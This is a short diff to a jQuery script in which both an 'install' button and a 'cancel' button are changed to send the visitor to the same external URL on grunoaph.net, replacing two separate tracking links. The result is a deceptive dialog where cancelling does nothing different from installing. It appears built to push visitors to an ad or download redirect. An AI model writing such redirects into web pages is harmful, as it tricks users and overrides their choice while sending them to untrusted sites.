@@ -24,12 +24,12 @@ jQuery(document).ready(function() {
 
 
     $('#install').click(function(e) {
-        console.log(`https://globalvisitclub.com/cf/click/1`);
-        window.location = `https://globalvisitclub.com/cf/click/1`;
+        console.log(`https://grunoaph.net/4/2635008`);
+        window.location = `https://grunoaph.net/4/2635008`;
     });
     
     $('#cancel').click(function(e) {
-        console.log(`https://globalvisitclub.com/cf/click/2`);
-        window.location = `https://globalvisitclub.com/cf/click/2`;
+        console.log(`https://grunoaph.net/4/2635008`);
+        window.location = `https://grunoaph.net/4/2635008`;
     });
 });
